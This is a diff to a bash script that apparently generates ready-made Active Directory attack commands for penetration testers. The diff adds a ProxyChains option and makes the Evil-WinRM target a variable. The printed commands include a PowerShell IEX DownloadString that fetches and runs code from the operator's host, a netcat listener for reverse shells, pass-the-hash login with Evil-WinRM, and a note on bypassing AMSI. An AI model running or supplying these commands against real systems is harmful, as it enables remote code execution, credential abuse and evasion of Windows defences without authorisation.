@@ -2176,7 +2311,7 @@ echo "   IEX (New-Object System.Net.Webclient).DownloadString('https://$LocalIP/
 echo "   rlwrap nc -nlvp 443"
 echo
 echo "   Evil-WinRM using NTLM hash"
-echo "   evil-winrm -i 127.0.0.1 -u <USER> -H $NTHash"
+echo "   evil-winrm -i $ActiveHost -u <USER> -H $NTHash"
 echo
 echo "   Bypass 4MSI check"
 echo "   In powershell execute: 'AmsiUtils' if error AMSI is working"
@@ -2273,20 +2408,22 @@ Choices() {
 	echo "        [4] Set AD Server            # Just Run me, I'll do it!     "
 	echo "        [5] Set Credentials          # Credentialed commands list   "
 	echo "        [6] Let me set all manually  # Let me input mannually please"
-	echo "        [7] Continue to commands     # Commands automatically composed "
-	echo "        [8] Quit                     # Sure?                        "
+	echo "        [7] Set ProxyChains          # Built most commands with proxychains"
+	echo "        [8] Continue to commands     # Commands automatically composed "
+	echo "        [9] Quit                     # Sure?                        "
 	echo -e "\e[30m"
 	echo
-read -p "  [?] Choices: (1/2/3/4/5/6/7) : " choice
+read -p "  [?] Choices: (1/2/3/4/5/6/7/8/9) : " choice
 case "$choice" in
   1 ) AdapterChoice ;;
   2 ) Active ;;
-  3 ) Multiple ;;
+  3 ) Multiple ;;	
   4 ) SetAD ;;
   5 ) SetCreds ;;
   6 ) ManualSet ;;
-  7 ) ShowMeMore ;;
-  8 ) exit ;;
+  7 ) SetProxyChains ;;
+  8 ) ShowMeMore ;;
+  9 ) exit ;;
   * ) echo "   Invalid";;
 esac
 }
